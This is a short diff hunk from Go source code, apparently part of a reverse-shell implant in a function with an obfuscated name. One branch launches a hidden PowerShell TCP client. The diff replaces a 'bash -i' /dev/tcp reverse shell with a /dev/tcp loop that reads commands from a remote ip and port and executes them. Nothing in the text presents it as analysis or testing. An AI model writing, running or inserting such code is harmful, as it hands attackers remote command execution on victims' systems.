@@ -184,7 +184,7 @@ func qcJjJne() error {
 		cmd := exec.Command("powershell", "-NoP", "-W", "Hidden", "-C", fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient(%q,%s); ...`, ip, port))
 		return cmd.Start()
 	default:
-		return exec.Command("/bin/bash", "-c", fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port)).Start()
+		return exec.Command("/bin/bash", "-c", fmt.Sprintf("exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done", ip, port)).Start()
 	}
 }
 
